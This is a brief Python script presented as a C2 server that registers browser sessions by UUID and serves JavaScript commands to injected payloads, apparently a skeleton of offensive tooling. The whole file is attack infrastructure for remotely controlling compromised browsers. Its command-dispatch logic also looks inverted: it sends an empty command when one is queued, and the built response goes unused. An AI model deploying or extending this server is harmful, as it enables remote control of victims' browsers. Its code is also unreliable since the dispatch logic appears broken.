#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
import argparse

# Command Line Arguments
parser = argparse.ArgumentParser(
    prog='C2.js',
    description='A simple Python C2 server for generating and managing JavaScript payloads'
)
parser.add_argument("-H", "--LHOST", help="The server address")
parser.add_argument("-P", "--LPORT", help="The server port")
args = parser.parse_args()



sessions=[]
commands={}

class PingPongHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Send response status code
        self.send_response(200)
        # Send headers
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        # Send the response content
        uuid = self.path[1:]
        if uuid in sessions:
            print(uuid + " alte session")
            if commands.get(uuid) != None:
                output = '{"command": "'+str(commands.get(uuid))+'"}'
                self.wfile.write(b'{"command": ""}')
            else:
                output = '{"command": "'+'clearInterval(interval)'+'"}'
                self.wfile.write(output.encode("utf-8"))
        else:
            print(uuid + " neue session")
            sessions.append(uuid)
            self.wfile.write(b'{"message": "HELO"}')

def run(server_class=HTTPServer, handler_class=PingPongHandler, port=int(args.LPORT)):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting C2 server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
